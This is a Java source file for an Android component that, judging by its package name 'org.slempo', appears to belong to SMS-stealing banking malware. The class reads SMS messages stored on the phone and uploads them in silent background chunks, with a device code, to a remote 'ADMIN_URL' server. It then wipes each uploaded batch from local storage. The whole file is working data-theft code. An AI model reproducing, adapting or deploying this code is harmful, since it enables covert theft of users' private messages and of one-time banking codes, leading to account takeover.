package org.slempo.service.utils;

import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slempo.service.Constants;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.http.AndroidHttpClient;

public class MessagesContentSender {
	
	private static boolean IS_SENDING_STARTED = false;
	
	public static boolean isWorking() {
		return IS_SENDING_STARTED;
	}
	
	public static void startSending(final Context context) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME,
						Context.MODE_PRIVATE);
				try {
					JSONArray jArray = new JSONArray(settings.getString(Constants.MESSAGES_DB, "[]"));
					if (jArray.length() != 0) {
						IS_SENDING_STARTED = true;
						ArrayList<JSONObject> messages = new ArrayList<JSONObject>();
						for (int i = 0; i < jArray.length(); i++) {
							messages.add(jArray.getJSONObject(i));
						}
						DefaultHttpClient httpclient = new DefaultHttpClient();
						while (true) {
							JSONArray chunk = new JSONArray();
							for (int i = 0; i < Constants.MESSAGES_CHUNK_SIZE && i < messages.size(); i++) {
								chunk.put(messages.get(i));
							}
							HttpPost httpPost = new HttpPost(Constants.ADMIN_URL);
							JSONObject jObj = new JSONObject();
							jObj.put("type", "sms content");
							jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
							jObj.put("sms", chunk);
							try {
								httpPost.addHeader("Content-Type", "application/json");
								httpPost.addHeader("Content-Encoding", "gzip");
								httpPost.setEntity(AndroidHttpClient.getCompressedEntity(jObj.toString().getBytes("UTF-8"), context.getContentResolver()));
								HttpResponse response = httpclient.execute(httpPost);
								if (response.getStatusLine().getStatusCode() != 200) {
									throw new Exception("Status code "
											+ response.getStatusLine().getStatusCode()
											+ " "
											+ EntityUtils.toString(response.getEntity()));
								} else {
									for (int i = 0; i < chunk.length(); i++) {
										messages.remove(0);
									}
									jArray = new JSONArray("[]");
									for (int i = 0; i < messages.size(); i++) {
										jArray.put(messages.get(i));
									}
									Utils.putStringValue(settings, Constants.MESSAGES_DB, jArray.toString());
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
							if (messages.size() == 0) {
								break;
							}
						}
					}
				} catch (JSONException e) {
					e.printStackTrace();
				} finally {
					IS_SENDING_STARTED = false;
				}
			}
		}).start();
	}
}
